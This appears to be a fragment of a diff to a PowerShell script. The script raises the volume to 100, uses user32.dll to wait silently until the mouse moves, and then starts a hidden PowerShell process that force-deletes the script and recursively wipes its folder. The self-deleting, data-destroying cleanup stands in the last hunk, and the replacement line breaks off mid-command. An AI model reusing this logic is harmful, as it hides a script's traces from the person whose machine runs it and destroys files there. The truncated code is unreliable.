@@ -13,26 +13,26 @@ function Set-Volume100 {
 }
 
 # Import user32.dll for mouse tracking
-Add-Type -TypeDefinition @"
-    using System;
-    using System.Runtime.InteropServices;
-    public class UserInput {
-        [DllImport("user32.dll")]
-        public static extern bool GetCursorPos(out POINT lpPoint);
-    }
-    public struct POINT {
-        public int X;
-        public int Y;
-    }
+Add-Type @"
+using System;
+using System.Runtime.InteropServices;
+public struct POINT {
+    public int X;
+    public int Y;
+}
+public class UserInput {
+    [DllImport("user32.dll")]
+    public static extern bool GetCursorPos(out POINT lpPoint);
+}
 "@ -PassThru
 
 # Capture Initial Mouse Position
-$initialMouse = New-Object UserInput+POINT
+$initialMouse = New-Object POINT
 [UserInput]::GetCursorPos([ref]$initialMouse)
 
 # Wait for Mouse Movement Silently
 do {
-    $currentMouse = New-Object UserInput+POINT
+    $currentMouse = New-Object POINT
     [UserInput]::GetCursorPos([ref]$currentMouse)
     Start-Sleep -Milliseconds 500
 } while ($currentMouse.X -eq $initialMouse.X -and $currentMouse.Y -eq $initialMouse.Y)
@@ -59,4 +59,4 @@ $scriptFolder = Split-Path -Path $scriptPath -Parent
 Start-Sleep -Seconds 2  # Ensure script fully executes
 
 # Execute a hidden PowerShell process to delete the script
-Start-Process -WindowStyle Hidden -FilePath "powershell.exe" -ArgumentList "-Command `"Start-Sleep -Seconds 1; Remove-Item -Path '$scriptPath' -Force; Remove-Item -Path '$scriptFolder\*' -Force -Recurse -ErrorAction SilentlyContinue`"" -NoNewWindow
+Start-Process -WindowStyle Hidden -FilePath "powershell
